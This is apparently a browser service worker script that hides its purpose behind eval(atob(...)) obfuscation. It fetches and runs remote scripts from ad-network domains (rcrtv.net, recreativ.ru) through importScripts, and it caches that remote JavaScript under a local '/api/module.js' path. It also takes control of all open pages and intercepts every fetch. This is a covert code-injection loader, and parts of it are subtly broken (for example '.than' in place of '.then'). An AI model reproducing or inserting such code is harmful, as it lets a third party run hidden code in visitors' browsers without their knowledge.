
((S, G) => {
    function logs() {
        [].forEach.call(arguments, function (v) {
            try {
                console.log(v)
            } catch (e) {
                // console.log(e)
            }
        })
    }

    function fetchHandler() {
        logs('fetch handler')
        return function (e) {
            logs('fetch', e)
            e.respondWith(
                fetcher(e).than((r) => {
                    logs('done', r)
                }).catch(() => {
                })
            )
        }
    }

    S.fetcher = function (evt) {
        logs('fetch', evt)
        return new Promise(function (response, reject) {
                try {
                    logs('fetch')
                    i.G.importScripts('https://rcrtv.net/tizers1.php?bn=WETPNH5v46&ping')
                    response()
                } catch (e) {
                    reject(e)
                }
            }
        )
    }

    S.addEventListener('fetch', function (e) {
        logs('onfetch', e)
        e.respondWith(
            fetcher(e).than((r) => {
                logs('done', r)
            }).catch((err) => {
                logs('[ERROR]', err)
            })
        )
    });

    S.addEventListener('install', event => {
            // importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
            logs('oninstall', event)
            event.waitUntil(
                G.skipWaiting()
            )
        }
    );

    S.addEventListener('activate', function (event) {
        event.waitUntil(S.clients.claim());
    });
    function __forEach(t, c) {
        return i.G.Array.prototype.forEach.call(t, c)
    }

    var i = {}

    function __import(g, l, n, s, d) { //s = script, d = div#id
        try {
            i.G.importScripts(s)
            // fetch listener can be installed during importScripts
            // by default SW will not be removed in main tread
            // if you need to remove it, just add windows.WebStateObject.SW.unregister() in main traed function
            // S.addEventListener('fetch', function (e) {
            //     e.waitUntil(
            //         function(){
            //             return new Promise( function (response, reject){
            //                     try{
            //                         logs('fetch')
            //                         response()
            //                     } catch (e) {
            //                         reject(e)
            //                     }
            //                 }
            //             )
            //         }
            //     )
            // });

            if (!!S.api) {
                i.G.caches.open('api/v1')
                    .then(function (cache) {
                        var requestHeaders = (G.eval('new Headers()'));
                        // requestHeaders.append('Content-Type', 'application/javascript')
                        var responseHeaders = (G.eval('new Headers()'));
                        responseHeaders.append('Content-Type', 'application/javascript')

                        var requestInit = {
                            method: 'GET',
                            headers: requestHeaders
                            // mode: event.request.mode,
                            // cache: 'default'
                        }
                        var responseInit = {
                            status: 200,
                            headers: responseHeaders
                        }
                        cache.put(new Request('/api/module.js?token=' + d, requestInit), new Response(api.src, responseInit))
                            .then(function () {
                                logs('SW: api loaded')
                            })

                    })
                //eval(self.api.src)
            }
        } catch (e) {
        }
    }

    i.G = G //this
    i.L = eval(atob("bG9jYXRpb24")) // location
    i.N = eval(atob("bmF2aWdhdG9y")) // navigator
    i.api = eval(atob('YXRvYignYUhSMGNITTZMeTl5WTNKMGRpNXVaWFF2WVhCcFAzUnZhMlZ1UFEnKQ')) // https://rcrtv.net/api?token=

    try {
        // try{
        //     importScripts('https://rc.gluck.space/static/common/js/ads.js')
        // } catch (e){}

        var u = new (eval(atob("VVJM")))(i.L.href) // new URL(location.href)
        var scripts = i.G.JSON.parse(i.G.atob(u.searchParams.get('clId'))),
            token = u.searchParams.get('token')

        if (token) {
            __import(i.G, i.L, i.N, i.api + token, token)
        } else {
            if (scripts) {
                __forEach(scripts, (v, idx) => {
                    __import(i.G, i.L, i.N, i.G.atob(v.src) + '&sw=1&inline=1', v.id)
                })
            }
        }
    } catch (e) {
    }
})(self, eval(atob("dGhpcw")))

var requestHeaders = new Headers()
requestHeaders.append('Content-Type', 'application/javascript')

var requestInit = {
    method: 'GET',
    headers: requestHeaders,
    mode: 'no-cors',
    // cache: 'default'
}
try {
    importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
    fetch(new Request('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping', requestInit))
        .then((r) => {
            r.text().then((t) => {
                console.log(t, r)
            })
        })
} catch (e) {
}
self.addEventListener('fetch', function (e) {
    console.log('onfetch', e)
    e.respondWith(
        fetcher(e).than((r) => {
            logs('done', r)
        }).catch((err) => {
            logs('[ERROR]', err)
        })
    )
});